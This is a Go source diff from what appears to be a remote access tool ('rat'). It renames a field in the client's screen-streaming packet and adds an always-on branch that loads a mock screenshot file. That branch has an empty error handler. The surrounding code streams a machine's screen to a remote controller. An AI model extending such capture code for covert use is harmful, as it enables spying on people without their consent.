@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"image"
 	"image/jpeg"
+	"os"
 	"rat/client/screen"
 	"rat/shared/network/header"
 
@@ -17,10 +18,10 @@ var handle int
 var scale float32
 
 type RecvScreenPacket struct {
-	Run     bool    "active"
-	Scale   float32 "scale"
-	Monitor bool    "monitor"
-	Handle  int     "handle"
+	Active  bool
+	Scale   float32
+	Monitor bool
+	Handle  int
 }
 
 func (packet RecvScreenPacket) Header() header.PacketHeader {
@@ -38,12 +39,12 @@ func (packet SendScreenPacket) Header() header.PacketHeader {
 }
 
 func (packet RecvScreenPacket) OnReceive() error {
-	if packet.Run && !screenStream {
+	if packet.Active && !screenStream {
 		// Dispatch one screen packet
 		Queue <- &SendScreenPacket{}
 	}
 
-	screenStream = packet.Run
+	screenStream = packet.Active
 	monitor = packet.Monitor
 	handle = packet.Handle
 	scale = packet.Scale
@@ -57,8 +58,18 @@ func (packet *SendScreenPacket) Init() {
 	var w bytes.Buffer
 
 	var img image.Image
+	if true {
+		// Read image from file that already exists
+		existingImageFile, err := os.Open("mock_scrot.png")
+		if err != nil {
+			// Handle error
+		}
+		defer existingImageFile.Close()
 
-	if monitor {
+		// Calling the generic image.Decode() will tell give us the data
+		// and type of image it is as a string. We expect "png"
+		img, _, _ = image.Decode(existingImageFile)
+	} else if monitor {
 		if handle >= len(screen.Monitors) {
 			handle = 0
 		}
